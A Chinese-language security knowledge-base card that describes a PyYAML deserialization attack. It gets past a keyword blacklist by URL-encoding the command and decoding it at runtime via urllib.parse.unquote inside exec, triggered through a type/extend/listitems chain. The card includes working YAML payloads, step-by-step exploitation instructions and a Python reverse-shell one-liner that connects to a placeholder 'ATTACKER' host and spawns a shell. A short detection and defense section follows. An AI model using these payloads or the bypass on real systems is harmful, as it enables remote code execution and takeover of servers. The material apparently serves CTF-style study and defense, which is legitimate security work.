---
id: web-python-deserialization-pyyaml-blacklist-urlencode-unquote-exec
title: PyYAML 反序列化关键字黑名单：命令整体 URL 编码 + urllib.parse.unquote 运行时解码绕过
type: scenario
domain: web
path: web/python/deserialization
technique: pyyaml-blacklist-urlencode-unquote-exec
tags:
- python
- pyyaml
- yaml
- deserialization
- waf-bypass
- urlencode
- exec
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-3W
  verified_at: '2026-11-08T17:17:36+08:00'
  notes: '已对照原文核对（yaml.load 未指定 Loader 对应 <5.1 不安全构造器、黑名单整串关键字、!!python/object/new:type + args + {extend: !!python/name:exec} + listitems 链、urllib.parse.unquote 二次解码、Python 反弹 shell 一致）；本次核对未读取图片，仅依据正文；原文黑名单漏逗号导致 builtins/run 连成一项，卡片未依赖该细节，未复现'
url: /docs/web/python/deserialization/web-python-deserialization-pyyaml-blacklist-urlencode-unquote-exec/
draft: false
kb_aliases:
- yaml.load 黑名单 URL 编码绕过
- 「!!python/object/new:type」+ extend 触发 exec
- urllib.parse.unquote 二次解码
- pyyaml WAF 编码绕过
- listitems 触发 extend
---

## 一句话结论

上传 `.yaml` 后被 `yaml.load(file_content)` 解析（PyYAML 5.1 之前的默认不安全构造器）时，服务端对文件内容做关键字黑名单（封了 `os`、`system`、`popen`、`eval`、`subprocess`、`base64`、`join`、`+`、`\x`、`\u` 等一长串），但**没有封 URL 编码**；于是把整段命令 URL 编码后塞进 `!!python/object/new:type` 的 `listitems`，配合 `{"extend": !!python/name:exec}` 让 PyYAML 在构造时调用 `exec`，payload 内先 `import urllib` 再 `exec(urllib.parse.unquote('...'))` 还原并执行。

## 原理

- `yaml.load` 在老版本默认使用不安全的 `Constructor`，`!!python/object/new:<callable>`、`!!python/name:<callable>` 都可用：前者实例化对象，后者引用任意 Python 对象。
- `!!python/object/new:type` 等价 `type(name, bases, dict)`，第三参数（类字典）里可以放 `{"extend": !!python/name:exec}`，即把实例的 `extend` 属性指向 `exec`。
- PyYAML 构造带 `listitems` 的对象时会调用实例的 `extend(listitems)`——于是 `exec(listitems)` 被执行，`listitems` 的内容就是待执行代码。这条链的关键是「属性赋值 + 构造器回调」而不是 `object/apply`，因此在 `object/apply` 被禁的 FullConstructor 上也可能成立。
- 黑名单是在 YAML 解析前对**原始文件内容**做子串匹配，它不认识 URL 编码：`%5f%5f%69%6d%70%6f%72%74%5f%5f` 里没有 `__import__` 字面量。执行期用 `urllib.parse.unquote` 还原，等价于二次解码。
- 为什么不用 `\x`/`\u` 转义：黑名单明确封了 `\u`、`\x`、`+`、`base64`、`join`，把常见的字符串构造路径都堵了；URL 编码是唯一没被列入名单的编码方式。
- 反弹 shell 用纯 Python 写（`socket` + `os.dup2` + `pty.spawn`），避免依赖目标有 `bash -i` 的交互能力。

## 触发条件

- 应用用 `yaml.load`（未指定 `SafeLoader`）解析用户可控内容；PyYAML 版本处于默认不安全构造器区间（<5.1，或显式用了 `yaml.Loader`/`UnsafeLoader`）。
- 存在文件上传且只校验后缀为 `.yaml`（`.*\.yaml$`），内容不校验。
- 黑名单是子串匹配且未覆盖 URL 编码（或未做一次 `unquote` 后再匹配）。
- 目标可出网（反弹）或命令结果可落地回显。

## 利用步骤

1. 上传一个含 `!!python/object/apply:os.system ["id"]` 的 yaml，确认是否被黑名单拦下（拦下说明是关键字匹配而非禁用标签）。
2. 把要执行的命令整体 URL 编码，再包进 `urllib.parse.unquote`。
3. 组装 payload（`!!python/object/new:type` + `extend: exec` + `listitems`）：

```yaml
!!python/object/new:type
args:
  - exp
  - !!python/tuple []
  - {"extend": !!python/name:exec }
listitems: "import urllib; exec(urllib.parse.unquote('%5f%5f%69%6d%70%6f%72%74%5f%5f%28%27%6f%73%27%29%2e%73%79%73%74%65%6d%28%27%70%79%74%68%6f%6e%33%20%2d%63%20%5c%27%69%6d%70%6f%72%74%20%6f%73%2c%70%74%79%2c%73%6f%63%6b%65%74%3b...%5c%27%27%29'))"
```

4. 上传后由 `/Yam1?filename=xxx` 之类路由读取并 `yaml.load`，触发 `exec`。
5. 若被拦，逐段排查命中词：`os`、`system`、`run`、`bash`、`sh`（注意 `sh` 会命中 `bash`）、`env`、`curl`、`nc`，全部用编码规避。

## PoC

明文意图（先本地验证链，再整体 URL 编码）：

```yaml
!!python/object/new:type
args: [exp, !!python/tuple [], {"extend": !!python/name:exec }]
listitems: "import os; os.system('id')"
```

编码后即为上文的可用形态。命令本体：

```python
__import__('os').system('python3 -c \'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER",7777));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")\'')
```

## 变体与关联

- 变体：`listitems` 换成 `state` + `__setstate__: !!python/name:exec`；或 `map` + `tuple` 消费惰性求值（见 FullConstructor 绕过卡）。
- 变体：黑名单若补上 `unquote`，可改用 `codecs.decode(..., 'rot13')`、`bytes.fromhex` 等未被封的解码器；核心始终是「编码不在名单 → 运行期解码」。
- 变体：`import urllib` 也可写成 `__import__('urllib')` 的编码形态（`%5f%5f...`），二者都避开 `import` 字面匹配时更稳。
- 关联：[[web-python-deser-pyyaml-tag-directive-waf-bypass-linecache]]（同为 PyYAML WAF 绕过，那条用 `%TAG` 指令绕 `!!python` 关键字、走 `linecache` 读文件；本条绕的是「危险函数名」黑名单，走 `type.extend→exec`）。
- 关联：[[web-python-deserialization-pyyaml-default-loader-object-apply-rce]]（黑名单完全不存在时的直接 `object/apply` 形态）。
- 关联：[[web-python-deserialization-pyyaml-fullconstructor-bypass-object-new]]（`object/new` 系构造链的完整列表）。

## 检测与防御

- 防御：一律 `yaml.safe_load`；PyYAML ≥6 要求显式 Loader，直接写 `yaml.load()` 会报错，但老代码仍可能显式传 `Loader=yaml.Loader`。
- 防御：不要用关键字黑名单防护反序列化；用 SafeLoader 才是语义层的修复。
- 防御：上传的 yaml 不应被服务端解析；确需解析时先做 AST/结构校验（只允许标量/列表/映射，拒绝任何 `!!python/*` 标签）。
- 检测：yaml 内容出现 `!!python/object/new`、`!!python/name`、`extend`、`listitems`、大段 `%XX` 编码；解析进程出现 `exec`/`os.system` 与对外连接；`/Yam1` 类路由被高频访问。
- 响应：下线解析入口、清理落地文件、轮换容器环境变量中的 flag/凭据。
